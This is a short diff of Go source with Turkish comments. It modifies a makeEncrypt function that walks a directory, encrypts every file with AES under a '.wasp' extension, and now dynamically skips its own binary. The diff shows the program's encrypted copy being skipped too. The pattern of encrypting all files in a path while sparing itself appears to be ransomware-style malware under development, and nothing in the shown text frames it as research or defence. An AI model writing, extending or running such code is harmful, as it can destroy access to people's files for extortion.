@@ -106,13 +106,24 @@ func encryptAES(plainText []byte, key []byte) ([]byte, error) {
 	return encryptedData, nil
 }
 
-// makeEncrypt - Dizindeki tüm dosyaları şifreler
+// makeEncrypt - Dizindeki tüm dosyaları şifreler (kendi binary'sini dinamik olarak hariç tutar)
 func makeEncrypt(path string, key []byte) error {
+	// Programın kendi binary adını al (dinamik)
+	binaryName := filepath.Base(os.Args[0])
+	// Şifrelenmiş halini de hariç tut
+	binaryPattern := binaryName + ".wasp"
+
 	err := filepath.Walk(path, func(filePath string, info os.FileInfo, err error) error {
 		if err != nil {
 			return err
 		}
 		if !info.IsDir() {
+			// Kendi binary'lerini şifreleme listesinden çıkar (dinamik)
+			if filePath == binaryName || filePath == binaryPattern {
+				fmt.Printf("  ℹ️  Kendi dosyası atlandı: %s\n", filePath)
+				return nil
+			}
+
 			content, err := os.ReadFile(filePath)
 			if err != nil {
 				fmt.Printf("  ⚠️  Dosya okuma hatası (%s): %v\n", filePath, err)
